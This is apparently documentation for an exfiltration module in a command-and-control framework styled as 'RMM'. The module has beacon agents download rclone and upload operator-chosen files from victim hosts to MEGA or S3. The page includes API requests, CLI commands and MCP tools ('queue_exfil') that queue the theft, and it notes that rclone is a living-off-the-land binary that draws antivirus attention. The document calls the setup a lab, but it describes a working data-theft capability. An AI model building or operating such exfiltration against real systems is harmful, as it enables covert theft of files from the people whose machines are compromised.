# rclone exfil

Operators queue exfil of a **remote file on the agent** to cloud storage (MEGA, S3, …) using **rclone on the agent host**. The server holds the rclone binary and named remote profiles; credentials are sent to the agent only inside the ephemeral `__EXFIL__` job payload.

## Flow

1. Operator queues via REST, CLI, MCP, or web UI (`exfil`).
2. Server enqueues `__EXFIL__` with JSON: local path, profile name, destination, and `RCLONE_CONFIG_*` env vars.
3. Agent downloads `rclone.exe` from the server once (beacon auth) into `%LOCALAPPDATA%\RMM\rclone.exe` if missing.
4. Agent runs `rclone copyto` (and `rclone link` for MEGA) with `--config NUL`.
5. Agent POSTs `cloud_upload` result; transcript shows `remote_path → link` or destination path.

Traffic exits the **agent network**, not the RMM server.

## Server setup

### 1. rclone binary

Place Windows **amd64** `rclone.exe` in `tools/rclone/` or set:

```bash
export RMM_RCLONE_BIN=/path/to/rclone.exe
```

Agents fetch: `GET /tools/rclone.exe?id=<session_id>` (beacon token required).

### 2. Remote profiles

Define named profiles as JSON:

| Variable | Purpose |
|----------|---------|
| `RMM_RCLONE_PROFILES` | Inline JSON object of profiles |
| `RMM_RCLONE_PROFILES_FILE` | Path to a JSON file (overrides inline if both set) |
| `RMM_RCLONE_DEFAULT_PROFILE` | Default profile when `--profile` omitted (default `mega-lab`) |
| `RMM_RCLONE_MAX_BYTES` | Max file size (default 100 MB) |

Example file (`tools/rclone/profiles.example.json`):

```json
{
  "mega-lab": {
    "type": "mega",
    "user": "lab@example.com",
    "pass": "secret",
    "folder": "RMM",
    "description": "Lab MEGA account"
  },
  "s3-lab": {
    "type": "s3",
    "provider": "AWS",
    "access_key_id": "AKIA...",
    "secret_access_key": "...",
    "region": "us-east-1",
    "folder": "rmm-uploads"
  }
}
```

Copy credentials into your lab config; do not commit real secrets.

Check status:

```bash
rmm_cli.py rclone-config
curl -s -H "Authorization: Bearer $RMM_API_TOKEN" http://127.0.0.1:8080/api/v1/rclone/config
```

## Operator API

```http
POST /api/v1/sessions/{id}/exfil
Authorization: Bearer <RMM_API_TOKEN>
Content-Type: application/json

{"remote_path": "C:\\Users\\x\\doc.pdf", "profile": "mega-lab", "dest": "optional/path/file.pdf"}
```

```http
GET /api/v1/rclone/config
```

## CLI and MCP

- `rmm_cli.py exfil <remote_path> [--profile NAME] [--dest PATH]`
- `rmm_cli.py rclone-config [--json]`
- MCP: `queue_exfil`, `get_rclone_config`
- Web UI: profile dropdown populated from `GET /rclone/config` (type + folder label)

## Result event

`type`: `cloud_upload`

```json
{
  "remote_path": "C:\\Users\\x\\doc.pdf",
  "profile": "mega-lab",
  "backend": "mega",
  "dest": "RMM/doc.pdf",
  "success": true,
  "link": "https://mega.nz/#!…",
  "size": 12345,
  "error": null
}
```

## Security (lab)

- Credentials travel in the beacon command queue (HTTPS); they are not stored in `client_rmm.ps1`.
- rclone env vars are cleared after each job on the agent.
- Use dedicated lab cloud accounts with limited quota.
- rclone is a known living-off-the-land binary; expect AV interest outside lab VMs.

## Related code

| File | Role |
|------|------|
| `rmm_rclone.py` | Profiles, env builder, exfil payload |
| `server_rmm.py` | `queue_agent_exfil`, `/tools/rclone.exe`, `cloud_upload` handler |
| `client_rmm.ps1` | Bootstrap, `Invoke-RmmRcloneExfil` |
| `tools/rclone/` | Binary + example profiles |

## Module reference (`rmm_rclone.py`)

| Symbol | Role |
|--------|------|
| `load_profiles()` | Read profiles from env/file |
| `get_profile(name)` | Resolve named profile |
| `profile_to_rclone_env(profile)` | Build `RCLONE_CONFIG_RMM_*` dict |
| `build_exfil_command(...)` | Full `__EXFIL__` command string |
| `rclone_public_config()` | Operator-safe status dict |
